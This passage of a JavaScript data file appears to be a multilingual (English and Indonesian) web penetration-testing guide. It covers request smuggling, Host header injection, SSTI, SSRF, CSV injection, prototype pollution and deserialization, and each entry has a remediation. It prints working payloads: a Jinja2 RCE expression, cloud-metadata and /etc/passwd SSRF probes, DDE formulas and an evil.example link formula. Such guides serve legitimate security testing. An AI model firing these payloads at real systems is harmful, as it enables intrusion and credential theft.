          'Payload CL.TE: body chunked yang diujinya ada `GET /admin` nyelip — nanti nyangkut di request orang berikutnya.',
          'Coba juga TE.CL dan TE.TE — kadang salah satu lolos.',
          'Bukti kalau respons buat user lain isinya dari request kita.'
        ]
      },
      tools: ['Burp Suite (HTTP Request Smuggler)', 'Smuggler', 'netcat', 'h2csmuggler'],
      remediation: {
        en: 'Normalize request parsing end to end: reject ambiguous Transfer-Encoding/Content-Length combinations at the front-end, use HTTP/2 between hops, and keep the proxy stack homogeneous.',
        t: 'Normalisasi parsing request dari ujung ke ujung: tolak kombinasi Transfer-Encoding/Content-Length ambigu di front-end, gunakan HTTP/2 antar hop, dan jaga stack proxy tetap homogen.',
        b: 'Penguraian permintaan perlu diseragamkan di seluruh rantai: front-end harus menolak kombinasi Transfer-Encoding/Content-Length yang saling bertentangan, komunikasi antar-hop sebaiknya memakai HTTP/2, dan tumpukan proksi dijaga tetap seragam.',
        s: 'Request yang ambigu harus ditolak di depan. Kalau bisa pakai HTTP/2 antara proxy dan server biar nggak ada beda pendapat.'
      }
    },

    {
      name_en: 'Testing for Host Header Injection',
      name_id: { t: 'Pengujian Host Header Injection', b: 'Pengujian Injeksi Tajuk Host', s: 'Nyerang Header Host' },
      summary: {
        en: 'Applications that trust the Host header for link generation, password resets, and redirects let an attacker hijack those flows — poisoned reset emails and password-reset links pointing to attacker domains are the classic impact.',
        t: 'Aplikasi yang mempercayai header Host untuk pembuatan link, reset password, dan redirect membiarkan penyerang membajak alur tersebut — email reset beracun dan link reset password yang mengarah ke domain penyerang adalah dampak klasiknya.',
        b: 'Aplikasi yang mempercayai tajuk Host untuk pembuatan tautan, atur ulang sandi, dan pengalihan membiarkan penyerang membajak alur tersebut — surel reset beracun dan tautan atur ulang sandi yang mengarah ke domain penyerang adalah dampak klasiknya.',
        s: 'Header `Host` bisa kita ubah. Kalau aplikasi pakai dia buat bikin link — apalagi link reset password — kita bisa bikin korban kirim passwordnya ke situs kita.'
      },
      howto: {
        en: [
          'Send a request with a modified Host: `Host: evil.com` and observe whether the app breaks or reflects it.',
          'Check password-reset flows: request a reset with the injected Host and inspect the link in the email.',
          'Try alternate injection points: duplicate Host headers, absolute-URI overrides (`GET http://evil.com/ HTTP/1.1`), and `X-Forwarded-Host`.',
          'Check cache poisoning impact: a cached response generated with your Host poisons every visitor.',
          'Look for SSRF-like routing effects — some systems route internal requests based on Host.'
        ],
        t: [
          'Kirim request dengan Host yang dimodifikasi: `Host: evil.com` dan amati apakah aplikasi error atau memantulkannya.',
          'Periksa alur reset password: minta reset dengan Host terinjeksi dan periksa link di email.',
          'Coba titik injeksi alternatif: header Host ganda, override absolute-URI (`GET http://evil.com/ HTTP/1.1`), dan `X-Forwarded-Host`.',
          'Periksa dampak cache poisoning: respons cache yang dibuat dengan Host Anda meracuni setiap pengunjung.',
          'Cari efek routing mirip SSRF — sebagian sistem merutekan request internal berdasarkan Host.'
        ],
        b: [
          'Kirim permintaan dengan Host yang diubah: `Host: evil.com` dan amati apakah aplikasi galat atau memantulkannya.',
          'Periksa alur atur ulang sandi: minta atur ulang dengan Host tersuntik dan periksa tautan pada surel.',
          'Coba titik suntik alternatif: tajuk Host ganda, penimpa absolute-URI (`GET http://evil.com/ HTTP/1.1`), dan `X-Forwarded-Host`.',
          'Periksa dampak keracunan singgahan: respons tersinggah yang dibuat dengan Host Anda meracuni setiap pengunjung.',
          'Cari efek perutean mirip SSRF — sebagian sistem merutekan permintaan internal berdasarkan Host.'
        ],
        s: [
          'Ganti `Host: evil.com` di request — lihat apakah aplikasinya ambiqu atau malah ngererence situs kita.',
          'Yang paling bahaya: minta reset password sambil Host kita dipasang — cek link di emailnya, kadang arahnya ke domain kita.',
          'Coba kirim Host dua kali, atau pakai `X-Forwarded-Host: evil.com`.',
          'Kalau responsnya ke-cache, semua pengunjung kena racun.',
          'Beberapa server juga ngerutein request internal pakai Host — itu pintu SSRF.'
        ]
      },
      tools: ['Burp Suite', 'curl', 'Collaborator/custom domain', 'browser'],
      remediation: {
        en: 'Validate the Host header against an allowlist of permitted domains, reject requests with duplicate or unrecognizable Hosts, and hard-code the base URL for generated links instead of deriving it from the request.',
        t: 'Validasi header Host terhadap allowlist domain yang diizinkan, tolak request dengan Host ganda atau tak dikenal, dan hard-code base URL untuk link yang dibuat alih-alih menurunkannya dari request.',
        b: 'Validasi tajuk Host terhadap daftar izin domain yang diizinkan, tolak permintaan dengan Host ganda atau tak dikenal, dan tetapkan base URL untuk tautan yang dibuat alih-alih menurunkannya dari permintaan.',
        s: 'Server harus punya daftar domain resmi — Host selain itu ditolak. Link di email sebaiknya di-set manual, bukan ngikutin header.'
      }
    },

    {
      name_en: 'Testing for Server-side Template Injection',
      name_id: { t: 'Pengujian SSTI (Server-side Template Injection)', b: 'Pengujian Injeksi Templat Sisi Peladen', s: 'Suntik Template di Server' },
      summary: {
        en: 'User input is rendered inside a template engine, so expressions like {{7*7}} are evaluated server-side. Direct route to RCE in engines with powerful syntax (Jinja2, Twig, Freemarker).',
        t: 'Input user dirender di dalam template engine, sehingga ekspresi seperti {{7*7}} dievaluasi di sisi server. Jalur langsung ke RCE pada engine dengan sintaks kuat (Jinja2, Twig, Freemarker).',
        b: 'Masukan pengguna ditampilkan di dalam mesin templat, sehingga ekspresi seperti {{7*7}} dievaluasi di sisi peladen. Jalan langsung menuju RCE pada mesin dengan sintaks kuat (Jinja2, Twig, Freemarker).',
        s: 'Input kita masuk ke mesin template server. Ekspresi kayak `{{7*7}}` dihitung langsung — dan di engine yang kuat, itu tiket ngendaliin server.'
      },
      howto: {
        en: [
          'Send the math probe in every reflected field: `{{7*7}}` — a rendered `49` means the template engine evaluates your input.',
          'Disambiguate from other engines: `${7*7}` also rendering, or `{{7*7}}` returning 49 vs `7777777777` (Jinja2 vs Smarty) fingerprint the engine.',
          'Escalate to file read: `{{ \"\".__class__.__mro__[1].__subclasses__() }}` traversal to find file loaders, or Twig `{{[\'id\']|filter(\'system\')}}`.',
          'Use tplmap for automated exploitation: `./tplmap.py -u \"http://target.com/?name=test\"`.',
          'Aim for OS exec: Jinja2 `{{ config.__class__.__init__.__globals__[\'os\'].popen(\'id\').read() }}` — and document the command output.'
        ],
        t: [
          'Kirim probe matematika di setiap field refleksi: `{{7*7}}` — hasil `49` yang dirender berarti template engine mengevaluasi input Anda.',
          'Bedakan dari engine lain: `${7*7}` juga tereksekusi, atau `{{7*7}}` menghasilkan 49 vs `7777777777` (Jinja2 vs Smarty) untuk fingerprint engine.',
          'Eskalasi ke pembacaan file: penelusuran `{{ \"\".__class__.__mro__[1].__subclasses__() }}` untuk mencari file loader, atau Twig `{{[\'id\']|filter(\'system\')}}`.',
          'Gunakan tplmap untuk eksploitasi otomatis: `./tplmap.py -u \"http://target.com/?name=test\"`.',
          'Bidang eksekusi OS: Jinja2 `{{ config.__class__.__init__.__globals__[\'os\'].popen(\'id\').read() }}` — dan dokumentasikan keluaran perintahnya.'
        ],
        b: [
          'Kirim pemeriksa matematika pada setiap bidang pantulan: `{{7*7}}` — hasil `49` yang ditampilkan berarti mesin templat mengevaluasi masukan Anda.',
          'Bedakan dari mesin lain: `${7*7}` juga berjalan, atau `{{7*7}}` menghasilkan 49 vs `7777777777` (Jinja2 vs Smarty) untuk mengidentifikasi mesin.',
          'Naikkan ke pembacaan berkas: penelusuran `{{ \"\".__class__.__mro__[1].__subclasses__() }}` untuk mencari pemuat berkas, atau Twig `{{[\'id\']|filter(\'system\')}}`.',
          'Gunakan tplmap untuk eksploitasi otomatis: `./tplmap.py -u \"http://target.com/?name=test\"`.',
          'Bidang eksekusi OS: Jinja2 `{{ config.__class__.__init__.__globals__[\'os\'].popen(\'id\').read() }}` — dan dokumentasikan keluarannya.'
        ],
        s: [
          'Ketik `{{7*7}}` di semua kolom — kalau muncul `49`, mesin template ngejalanin kode kita.',
          'Cara bedain mesinnya: `${7*7}` buat yang lain, `{{7*7}}` jadi `49` itu Jinja2, jadi `7777777777` itu Smarty.',
          'Baca file: Jinja2 punya jalur `__class__` buat nyari class pembaca file — panjang tapi ampuh.',
          'Automasi gampang: `./tplmap.py -u \"http://target.com/?name=test\"` — dia nyoba semua mesin.',
          'Level akhir: `popen(\'id\')` buat jalanin perintah OS — simpan bukti keluarannya.'
        ]
      },
      tools: ['tplmap', 'Burp Suite', 'SSTImap', 'engine-specific payload lists'],
      remediation: {
        en: 'Keep user input out of template source: pass it as data variables into fixed templates, and run template engines in a locked-down/sandboxed configuration with dangerous built-ins disabled.',
        t: 'Jauhkan input user dari source template: kirim sebagai variabel data ke template tetap, dan jalankan template engine dalam konfigurasi terkunci/tersandbox dengan builtin berbahaya yang dimatikan.',
        b: 'Jauhkan masukan pengguna dari sumber templat: kirim sebagai variabel data ke templat tetap, dan jalankan mesin templat dalam konfigurasi terkunci/terasing dengan fungsi bawaan berbahaya yang dimatikan.',
        s: 'Input user jangan pernah masuk ke kode template — kirim sebagai data biasa. Matikan juga fungsi berbahaya engine-nya.'
      }
    },

    {
      name_en: 'Testing for Server-Side Request Forgery',
      name_id: { t: 'Pengujian SSRF (Server-Side Request Forgery)', b: 'Pengujian Pemalsuan Permintaan Sisi Peladen', s: 'Bikin Server Ngirim Request' },
      summary: {
        en: 'The server fetches a URL the attacker influences — hitting internal services, cloud metadata, or admin panels unreachable from outside. SSRF is the standard bridge from web app to internal network.',
        t: 'Server mengambil URL yang dipengaruhi penyerang — mengenai layanan internal, metadata cloud, atau panel admin yang tak terjangkau dari luar. SSRF adalah jembatan standar dari web app ke jaringan internal.',
        b: 'Peladen diminta mengambil URL yang dapat dipengaruhi penyerang, sehingga permintaan dapat menghantam layanan internal, metadata awan, atau panel admin yang tertutup dari luar. SSRF adalah jembatan baku dari aplikasi web menuju jaringan internal.',
        s: 'Kita bikin server yang ngambil alamat sesuka kita — termasuk alamat dalam yang nggak bisa diakses dari luar. Ini kunci nyolong kredensial cloud.'
      },
      howto: {
        en: [
          'Find URL-fetching parameters: `url=`, `image=`, `site=`, webhook endpoints, import/export features.',
          'Point one at your own listener to confirm fetch: `?url=http://yourcollaborator.example` and watch for the callback.',
          'Target internal resources: `?url=http://127.0.0.1:8080/admin`, `?url=http://169.254.169.254/latest/meta-data/` (AWS metadata).',
          'Try `file://` and `gopher://` schemes where handlers allow: `?url=file:///etc/passwd`.',
          'Bypass filters with alternative encodings: `http://0x7f.0.0.1/`, `http://[::1]/`, redirects from an allowed host, or DNS rebinding for persistent checks.'
        ],
        t: [
          'Cari parameter pengambil URL: `url=`, `image=`, `site=`, endpoint webhook, fitur import/export.',
          'Arahkan ke listener Anda sendiri untuk konfirmasi: `?url=http://yourcollaborator.example` dan tunggu callback-nya.',
          'Bidik resource internal: `?url=http://127.0.0.1:8080/admin`, `?url=http://169.254.169.254/latest/meta-data/` (metadata AWS).',
          'Coba skema `file://` dan `gopher://` bila handler mengizinkan: `?url=file:///etc/passwd`.',
          'Loloskan filter dengan penyandian alternatif: `http://0x7f.0.0.1/`, `http://[::1]/`, redirect dari host yang diizinkan, atau DNS rebinding untuk pemeriksaan persisten.'
        ],
        b: [
          'Cari parameter pengambil URL: `url=`, `image=`, `site=`, endpoint webhook, fitur impor/ekspor.',
          'Arahkan ke pendengar Anda sendiri untuk memastikan: `?url=http://yourcollaborator.example` dan tunggu panggilan baliknya.',
          'Bidik sumber daya internal: `?url=http://127.0.0.1:8080/admin`, `?url=http://169.254.169.254/latest/meta-data/` (metadata AWS).',
          'Coba skema `file://` dan `gopher://` bila penangan mengizinkan: `?url=file:///etc/passwd`.',
          'Loloskan saringan dengan penyandian alternatif: `http://0x7f.0.0.1/`, `http://[::1]/`, pengalihan dari host yang diizinkan, atau pengikatan ulang DNS untuk pemeriksaan gigih.'
        ],
        s: [
          'Cari parameter yang nerima alamat web: `url=`, `image=`, webhook.',
          'Arahin dulu ke server kita sendiri — kalau ada request masuk, server target mau ngambil apa pun yang kita suruh.',
          'Baru bidik dalam: `?url=http://127.0.0.1:8080/admin` atau `?url=http://169.254.169.254/latest/meta-data/` buat nyolong kredensial AWS.',
          'Coba juga `?url=file:///etc/passwd` kalau skema filenya diizinkan.',
          'Kalau diblokir, akalin: `http://0x7f.0.0.1/` sama saja dengan localhost tapi beda tulisannya.'
        ]
      },
      tools: ['Burp Suite', 'Collaborator', 'SSRFmap', 'Gopherus', 'ffuf (internal port scan)'],
      remediation: {
        en: 'Allowlist destination hosts/schemes, block private and link-local ranges (including their encoded forms), disable redirect following, and serve fetches through a dedicated egress proxy.',
        t: 'Buat allowlist host/skema tujuan, blokir rentang privat dan link-local (termasuk bentuk terenkode-nya), matikan pengikutan redirect, dan layani fetch melalui egress proxy khusus.',
        b: 'Buat daftar izin host/skema tujuan, blokir rentang privat dan link-local (termasuk bentuk terenkodenya), matikan pengikutan pengalihan, dan layani pengambilan melalui proksi keluar khusus.',
        s: 'Server hanya boleh ngambil alamat dari daftar resmi. Alamat internal dan localhost harus diblok — termasuk yang ditulis pake trik.'
      }
    },

    {
      name_en: 'Testing for Mass Assignment',
      name_id: { t: 'Pengujian Mass Assignment', b: 'Pengujian Penetapan Massal', s: 'Nambahin Field Senyap-senyap' },
      summary: {
        en: 'The framework blindly copies request fields onto model objects, so attacker-added parameters (`role`, `isAdmin`, `price`) overwrite attributes that were never meant to be client-set. A favorite privilege-escalation trick.',
        t: 'Framework menyalin field request ke objek model secara buta, sehingga parameter tambahan dari penyerang (`role`, `isAdmin`, `price`) menimpa atribut yang memang tidak dimaksudkan untuk diatur client. Trik eskalasi privilege favorit.',
        b: 'Kerangka kerja menyalin bidang permintaan ke objek model secara buta, sehingga parameter tambahan dari penyerang (`role`, `isAdmin`, `price`) menimpa atribut yang memang tidak dimaksudkan untuk diatur klien. Trik menaikkan hak akses yang favorit.',
        s: 'Framework kadang nerima semua field yang kita kirim dan langsung nempel ke modelnya. Kita nyelipin field `isAdmin: true` — bisa-bisa langsung jadi admin.'
      },
      howto: {
        en: [
          'Find a write endpoint (register, profile update, checkout) and note the fields the UI sends.',
          'Inspect the model for hidden fields — read API docs, guess names: `role`, `isAdmin`, `is_admin`, `userId`, `price`, `balance`, `verified`.',
          'Replay the request with the extra field: `PUT /api/profile {\"name\":\"me\",\"role\":\"admin\"}`.',
          'Check other objects too: address forms, order forms, and nested JSON (`{\"address\":{\"country\":\"XX\"}}` plus smuggled sibling keys).',
          'Verify whether the injected value stuck — reload the record or attempt an admin-only action.'
        ],
        t: [
          'Temukan endpoint tulis (registrasi, update profil, checkout) dan catat field yang dikirim UI.',
          'Periksa model untuk field tersembunyi — baca dokumentasi API, tebak namanya: `role`, `isAdmin`, `is_admin`, `userId`, `price`, `balance`, `verified`.',
          'Kirim ulang request dengan field ekstra: `PUT /api/profile {\"name\":\"me\",\"role\":\"admin\"}`.',
          'Periksa objek lain juga: form alamat, form pesanan, dan JSON bersarang (`{\"address\":{\"country\":\"XX\"}}` plus kunci saudara yang diselundupkan).',
          'Pastikan nilai suntikan bertahan — muat ulang record atau coba aksi khusus admin.'
        ],
        b: [
          'Temukan endpoint tulis (pendaftaran, pembaruan profil, pembayaran) dan catat bidang yang dikirim antarmuka.',
          'Periksa model untuk bidang tersembunyi — baca dokumentasi API, tebak namanya: `role`, `isAdmin`, `is_admin`, `userId`, `price`, `balance`, `verified`.',
          'Kirim ulang permintaan dengan bidang ekstra: `PUT /api/profile {\"name\":\"me\",\"role\":\"admin\"}`.',
          'Periksa objek lain juga: formulir alamat, formulir pesanan, dan JSON bersarang (`{\"address\":{\"country\":\"XX\"}}` plus kunci lain yang diselundupkan).',
          'Pastikan nilai suntikan menempel — muat ulang catatan atau coba tindakan khusus admin.'
        ],
        s: [
          'Cari endpoint yang nyimpen data: daftar akun, ubah profil, checkout.',
          'Tebak field tersembunyi di belakang model: `role`, `isAdmin`, `price`, `balance`.',
          'Kirim ulang request dengan nyelipin field itu: `{\"name\":\"me\",\"role\":\"admin\"}`.',
          'Coba juga di JSON bersarang kayak alamat atau pesanan — kadang ada field lain yang nggak keliatan di UI.',
          'Cek apakah nilainya nyangkut — buka ulang data atau coba masuk fitur admin.'
        ]
      },
      tools: ['Burp Suite', 'API docs (Swagger)', 'arjun', ' Param Miner (Burp extension)'],
      remediation: {
        en: 'Bind only explicitly whitelisted properties (DTOs/allowlists per endpoint), never pass raw request objects to model constructors, and keep sensitive fields server-managed only.',
        t: 'Ikat hanya properti yang secara eksplisit di-whitelist (DTO/allowlist per endpoint), jangan pernah meneruskan objek request mentah ke konstruktor model, dan kelola field sensitif hanya di sisi server.',
        b: 'Ikat hanya properti yang secara eksplisit masuk daftar izin (DTO/daftar izin per endpoint), jangan pernah meneruskan objek permintaan mentah ke konstruktor model, dan kelola bidang sensitif hanya pada sisi peladen.',
        s: 'Endpoint harus nyebut satu-satu field yang boleh masuk — jangan asal nempel semua yang dikirim. Field sensitif diatur server saja.'
      }
    },

    {
      name_en: 'Testing for CSV Injection',
      name_id: { t: 'Pengujian CSV Injection (Formula Injection)', b: 'Pengujian Injeksi CSV', s: 'Racun di File Excel/CSV' },
      summary: {
        en: 'User-supplied text stored into an exported CSV becomes a spreadsheet formula when an analyst opens it — `=cmd|...` payloads execute via Excel DDE. The app looks safe; the analyst workstation gets popped.',
        t: 'Teks dari user yang tersimpan ke CSV hasil ekspor menjadi rumus spreadsheet saat analis membukanya — payload `=cmd|...` tereksekusi lewat DDE Excel. Aplikasinya tampak aman; komputer analis yang jadi korban.',
        b: 'Teks dari pengguna yang tersimpan ke CSV hasil ekspor menjadi rumus lembar kerja saat analis membukanya — muatan `=cmd|...` berjalan melalui DDE Excel. Aplikasinya tampak aman; komputer analis yang menjadi korban.',
        s: 'Teks yang kita simpan bisa masuk ke file CSV yang diunduh staff. Saat dibuka di Excel, teks `=...` dianggap rumus — dan rumus bisa jalanin program.'
      },
      howto: {
        en: [
          'Identify inputs that flow into exports: comments, names, addresses, ticket text.',
          'Submit formula payloads in those fields: `=cmd|\'/C calc\'!A0` or `=2+5`, `=HYPERLINK(\"http://evil.example\",\"click\")`.',
          'Trigger the export/download and open the file in a spreadsheet app (test environment).',
          'Observe which payloads survive export — Excel, LibreOffice, and Google Sheets evaluate different formula sets.',
          'Note the prompt behavior users see (DDE warnings) — social-engineering friendly warnings are still findings.'
        ],
        t: [
          'Identifikasi input yang mengalir ke ekspor: komentar, nama, alamat, teks tiket.',
          'Kirim payload rumus di field tersebut: `=cmd|\'/C calc\'!A0` atau `=2+5`, `=HYPERLINK(\"http://evil.example\",\"click\")`.',
          'Picu ekspor/unduhan dan buka filenya di aplikasi spreadsheet (lingkungan uji).',
          'Amati payload mana yang bertahan di ekspor — Excel, LibreOffice, dan Google Sheets mengevaluasi kumpulan rumus yang berbeda.',
          'Catat peringatan yang dilihat user (peringatan DDE) — peringatan yang mudah disosial-rekayasa tetap merupakan temuan.'
        ],
        b: [
          'Identifikasi masukan yang mengalir ke ekspor: komentar, nama, alamat, teks tiket.',
          'Kirim muatan rumus pada bidang tersebut: `=cmd|\'/C kal\'!A0` atau `=2+5`, `=HYPERLINK(\"http://evil.example\",\"klik\")`.',
          'Picu ekspor/unduhan dan buka berkasnya di aplikasi lembar kerja (lingkungan uji).',
          'Amati muatan mana yang bertahan pada ekspor — Excel, LibreOffice, dan Google Sheets mengevaluasi himpunan rumus yang berbeda.',
          'Catat peringatan yang dilihat pengguna (peringatan DDE) — peringatan yang mudah dimanipulasi tetap merupakan temuan.'
        ],
        s: [
          'Cari input yang nanti jadi file CSV — nama, komentar, alamat.',
          'Ketik rumus jahat di situ: `=cmd|\'/C calc\'!A0` atau yang lebih jinak `=2+5`.',
          'Unduh file ekspornya, buka di Excel atau LibreOffice (di lab, jangan komputer kerja).',
          'Tiap aplikasi spreadsheet beda aturannya — coba di beberapa.',
          'Kalau muncul popup bahaya yang gampang diklik user, itu temuan.'
        ]
      },
      tools: ['Burp Suite', 'Excel/LibreOffice (test env)', 'csv export features', 'formula payload lists'],
      remediation: {
        en: 'Prefix cells that start with `=`, `+`, `-`, `@`, or a tab with a single quote or space before export, and sanitize stored data destined for spreadsheets.',
        t: 'Awali sel yang dimulai dengan `=`, `+`, `-`, `@`, atau tab dengan satu tanda kutip atau spasi sebelum ekspor, dan sanitasi data tersimpan yang ditujukan untuk spreadsheet.',
        b: 'Sebelum pengeksporan, setiap sel yang diawali `=`, `+`, `-`, `@`, atau tab wajib diberi satu tanda kutip atau spasi di depannya; selain itu, data tersimpan yang akan disajikan pada lembar kerja juga harus disanitasi.',
        s: 'Sebelum CSV diekspor, semua sel yang diawali `=` atau `+` harus dikasih tanda kutip di depannya biar dianggap teks biasa.'
      }
    },

    {
      name_en: 'Testing for Prototype Pollution',
      name_id: { t: 'Pengujian Prototype Pollution', b: 'Pengujian Polusi Prototipe', s: 'Ngeracun Object JavaScript' },
      summary: {
        en: 'In JavaScript, merging attacker-controlled keys like __proto__ into objects poisons Object.prototype — every object in the process inherits the injected property. Can flip logic flags, enable XSS sinks, or lead to RCE in Node apps.',
        t: 'Di JavaScript, penggabungan kunci yang dikontrol penyerang seperti __proto__ ke objek meracuni Object.prototype — semua objek dalam proses mewarisi properti suntikan itu. Bisa membalik logic flag, mengaktifkan sink XSS, atau berujung RCE di aplikasi Node.',
        b: 'Pada JavaScript, penggabungan kunci yang dikendalikan penyerang seperti __proto__ ke dalam objek meracuni Object.prototype — seluruh objek dalam proses lalu mewarisi properti sisipan itu. Akibatnya penanda logika dapat dibalik, lubang XSS diaktifkan, atau berujung pada RCE di aplikasi Node.',
        s: 'Bug JavaScript: kunci `__proto__` nyelip ke objek, dan tiba-tiba semua objek di aplikasi punya properti racun itu. Bisa dibikin jadi pintu XSS atau lebih parah.'
      },
      howto: {
        en: [
          'Find merge/clone/extend endpoints that accept JSON: profile updates, preference saves, deep-set config routes.',
          'Submit `__proto__` keys: `{\"__proto__\":{\"isAdmin\":true}}` or `{\"constructor\":{\"prototype\":{\"polluted\":\"yes\"}}}`.',
          'Detect pollution client-side: open console and run `({}).polluted` — if it prints, the prototype is polluted.',
          'Escalate to impact: look for properties the app reads on default objects — `isAdmin`, `disabled`, sanitization flags — and set them via pollution.',
          'In Node, chain toward known sinks (child_process spawn options via polluted `NODE_OPTIONS`, template engines) for RCE.'
        ],
        t: [
          'Cari endpoint merge/clone/extend yang menerima JSON: update profil, penyimpanan preferensi, route deep-set konfigurasi.',
          'Kirim kunci `__proto__`: `{\"__proto__\":{\"isAdmin\":true}}` atau `{\"constructor\":{\"prototype\":{\"polluted\":\"yes\"}}}`.',
          'Deteksi polusi di sisi client: buka console dan jalankan `({}).polluted` — jika tampil, prototype telah teracuni.',
          'Eskalasi ke dampak: cari properti yang dibaca aplikasi pada objek default — `isAdmin`, `disabled`, flag sanitasi — dan set melalui polusi.',
          'Di Node, rantakan ke sink yang diketahui (opsi spawn child_process via `NODE_OPTIONS` yang teracuni, template engine) untuk RCE.'
        ],
        b: [
          'Cari endpoint penggabungan/penyalinan yang menerima JSON: pembaruan profil, penyimpanan preferensi, rute pengaturan konfigurasi mendalam.',
          'Kirim kunci `__proto__`: `{\"__proto__\":{\"isAdmin\":true}}` atau `{\"constructor\":{\"prototype\":{\"polluted\":\"ya\"}}}`.',
          'Deteksi polusi di sisi klien: buka konsol dan jalankan `({}).polluted` — jika tampil, prototipe telah teracuni.',
          'Naikkan dampaknya: cari properti yang dibaca aplikasi pada objek bawaan — `isAdmin`, `disabled`, penanda sanitasi — dan pasang melalui polusi.',
          'Pada Node, rantakan ke lubang yang diketahui (opsi spawn child_process melalui `NODE_OPTIONS` yang teracuni, mesin templat) untuk RCE.'
        ],
        s: [
          'Cari endpoint yang nerima JSON dan ngegabungin objek — profil, preferensi.',
          'Kirim `{\"__proto__\":{\"isAdmin\":true}}` — kalau diterima mentah, itu bahaya.',
          'Cek di console browser: ketik `({}).polluted` — kalau ada isinya, prototype-nya kena racun.',
          'Cari properti yang dipakai aplikasi tapi nggak pernah di-set — kayak `isAdmin` — lalu suntik lewat `__proto__`.',
          'Di server Node, racun `NODE_OPTIONS` bisa berujung jalanin program — itu RCE.'
        ]
      },
      tools: ['Burp Suite', 'browser console', 'ppmap', 'Node.js server-side payloads'],
      remediation: {
        en: 'Use Object.create(null) or Map for untrusted key-value handling, block `__proto__`/`constructor`/`prototype` keys in merge utilities, and freeze Object.prototype where the stack allows.',
        t: 'Gunakan Object.create(null) atau Map untuk penanganan key-value tidak tepercaya, blokir kunci `__proto__`/`constructor`/`prototype` di utilitas merge, dan freeze Object.prototype bila stack mengizinkan.',
        b: 'Gunakan Object.create(null) atau Map untuk penanganan pasangan kunci-nilai tak tepercaya, blokir kunci `__proto__`/`constructor`/`prototype` pada utilitas penggabungan, dan bekukan Object.prototype bila tumpukan mengizinkan.',
        s: 'Utilitas merge wajid nolak kunci `__proto__` dan `constructor`. Data user jangan disimpen di objek biasa — pakai Map.'
      }
    },

    {
      name_en: 'Testing for Insecure Deserialization',
      name_id: { t: 'Pengujian Insecure Deserialization', b: 'Pengujian Deserialisasi Tidak Aman', s: 'Bongkar Data Berbahaya' },
      summary: {
        en: 'Deserializing attacker-controlled objects invokes their embedded logic — gadget chains in libraries turn a crafted blob into RCE. Affects Java, .NET, PHP, Python, and Ruby apps that accept serialized cookies, tokens, or files.',
        t: 'Deserialisasi objek yang dikontrol penyerang memicu logika yang tertanam di dalamnya — gadget chain pada library mengubah blob buatan menjadi RCE. Menyerang aplikasi Java, .NET, PHP, Python, dan Ruby yang menerima cookie, token, atau file terserialisasi.',
        b: 'Deserialisasi objek yang dikendalikan penyerang memicu logika yang tertanam di dalamnya — rantai peranti pada pustaka mengubah gumpalan buatan menjadi RCE. Ini menyerang aplikasi Java, .NET, PHP, Python, dan Ruby yang menerima kuki, token, atau berkas terserialisasi.',
        s: 'Aplikasi kadang nerima data "siap pakai" (serialized) dan langsung dinyalain. Data itu bisa kita racuni — dan begitu dibongkar server, kode jahat ikut jalan.'
      },
      howto: {
        en: [
          'Identify serialized artifacts: base64 blobs in cookies, `O:...` PHP strings, Java `aced0005` hex, Python pickle, .NET ViewState, Ruby Marshal.',
          'Confirm the format by modifying a non-critical value and checking whether the app accepts your tampering (signature check?).',
          'Tamper data-only fields first (price, role) to prove the object graph is attacker-controlled.',
          'Escalate to known gadget chains: Java ysoserial payloads, PHP `O:8:\"ClassName\":1:{...}` with POP gadgets, Python pickle `__reduce__` RCE, PHP/Ruby phar deserialization via file paths.',
          'Verify execution out-of-band or via a benign command payload like `touch /tmp/pwned` in a lab-safe way.'
        ],
        t: [
          'Identifikasi artefak terserialisasi: blob base64 di cookie, string PHP `O:...`, hex Java `aced0005`, pickle Python, ViewState .NET, Marshal Ruby.',
          'Konfirmasi formatnya dengan mengubah nilai non-kritis dan memeriksa apakah aplikasi menerima perubahan Anda (ada cek signature?).',
          'Ubah field data dulu (harga, role) untuk membuktikan object graph dikendalikan penyerang.',
          'Eskalasi ke gadget chain yang diketahui: payload ysoserial untuk Java, PHP `O:8:\"ClassName\":1:{...}` dengan gadget POP, RCE `__reduce__` pickle Python, deserialisasi phar PHP/Ruby via path file.',
          'Verifikasi eksekusi secara out-of-band atau dengan payload perintah jinak seperti `touch /tmp/pwned` di lingkungan lab yang aman.'
        ],
        b: [
          'Identifikasi artefak terserialisasi: gumpalan base64 pada kuki, untai PHP `O:...`, heksadesimal Java `aced0005`, acar Python, ViewState .NET, Marshal Ruby.',
          'Pastikan formatnya dengan mengubah nilai non-kritis dan memeriksa apakah aplikasi menerima perubahan Anda (adakah pemeriksaan tanda tangan?).',
          'Ubah bidang data dahulu (harga, peran) untuk membuktikan graf objek dikendalikan penyerang.',
          'Naikkan ke rantai peranti yang diketahui: muatan ysoserial untuk Java, PHP `O:8:\"ClassName\":1:{...}` dengan peranti POP, RCE `__reduce__` acar Python, deserialisasi phar PHP/Ruby melalui jalur berkas.',
          'Pastikan eksekusi secara luar pita atau dengan muatan perintah jinak seperti `touch /tmp/pwned` di lingkungan uji yang aman.'
        ],
        s: [
          'Kenali cirinya: cookie panjang aneh, teks diawali `O:` itu PHP, blok hex diawali `aced0005` itu Java.',
          'Coba ubah satu nilai kecil — kalau diterima tanpa protes, berarti nggak ada tanda tangan.',
          'Ganti nilai biasa dulu: harga, role — bukti awal kita pegang kendali.',
          'Lanjut ke "gadget chain" — di Java pakai ysoserial, di Python pickle bisa `__reduce__` jalanin perintah.',
          'Buktinya aman: perintah jinak kayak bikin file — jangan langsung kaka-kaka server orang.'
        ]
      },
      tools: ['ysoserial', 'Burp Suite (Java Deserialization Scanner)', 'PHPGGC', 'pickle tools', 'ViewSmith (.NET)'],
      remediation: {
        en: 'Do not deserialize untrusted data at all — use signed JSON or integrity-checked formats; where unavoidable, run deserialization in a low-privilege isolated process and keep libraries patched against gadget chains.',
        t: 'Jangan deserialisasi data tidak tepercaya sama sekali — gunakan JSON bertanda tangan atau format yang diperiksa integritasnya; bila terpaksa, jalankan deserialisasi di proses terisolasi berhak rendah dan patch library terhadap gadget chain.',
        b: 'Jangan sekali-kali melakukan deserialisasi terhadap data tak tepercaya — gunakan JSON bertanda tangan atau format yang integritasnya diperiksa. Apabila terpaksa, jalankan deserialisasi di proses terasing berhak rendah dan tambal pustaka terhadap rantai peranti.',
        s: 'Data dari luar jangan dibongkar mentah — pakai JSON yang ditandatangani. Kalau terpaksa, jalankan di proses terpisah dengan hak minimum, dan rajin update library.'
      }
    }
  ]
});
